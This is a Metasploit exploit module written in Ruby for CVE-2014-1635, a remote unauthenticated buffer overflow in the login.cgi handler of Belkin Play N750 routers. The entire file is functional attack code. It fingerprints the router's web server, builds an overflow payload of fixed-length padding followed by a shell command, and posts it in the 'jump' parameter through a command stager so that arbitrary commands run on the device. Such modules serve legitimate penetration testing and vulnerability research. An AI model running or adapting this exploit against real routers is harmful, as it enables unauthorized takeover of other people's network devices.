##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Belkin Play N750 login.cgi Buffer Overflow',
      'Description'    => %q{
        This module exploits a remote buffer overflow vulnerability on Belkin Play N750 DB
        Wireless Dual-Band N+ Router N750 routers. The vulnerability exists in the handling
        of HTTP queries with long 'jump' parameters addressed to the /login.cgi URL, allowing
        remote unauthenticated attackers to execute arbitrary code. This module was tested in
        an emulated environment, using the version 1.10.16.m of the firmwarey.
      },
      'Author'         =>
        [
          'Marco Vaz <mv[at]integrity.pt>', # Vulnerability discovery and msf module (telnetd)
          'Michael Messner <devnull[at]s3cur1ty.de>', # msf module with echo stager
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSLE,
      'References'     =>
        [
          ['CVE', '2014-1635'],
          ['EDB', '35184'],
          ['BID', '70977'],
          ['OSVDB', '114345'],
          ['URL', 'https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/'],
          ['URL', 'http://www.belkin.com/us/support-article?articleNum=4831']
        ],
      'Targets'        =>
        [
          [ 'Belkin Play N750 DB Wireless Dual-Band N+ Router, F9K1103,  firmware 1.10.16.m',
            {
              'Offset' => 1379,
            }
          ]
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 8080
        },
      'DisclosureDate' => 'May 09 2014',
      'DefaultTarget'  => 0))
      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => '/'
      })

      if res &&
        [200, 301, 302].include?(res.code) &&
        res.headers['Server'] &&
        res.headers['Server'] =~ /minhttpd/ &&
        res.body =~ /u_errpaswd/

        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("#{peer} - Accessing the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end

    print_status("#{peer} - Exploiting...")
    execute_cmdstager(
      :flavor  => :echo,
      :linemax => 200
    )
  end

  def prepare_shellcode(cmd)
    shellcode = rand_text_alpha_upper(target['Offset'])
    shellcode << 'e' << cmd
    shellcode << "\n\n"
  end

  def execute_command(cmd, opts)
    shellcode = prepare_shellcode(cmd)
    begin
      res = send_request_cgi({
        'method'    => 'POST',
        'uri'       => '/login.cgi',
        'vars_post' => {
          'GO'   => '',
          'jump' => shellcode,
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end
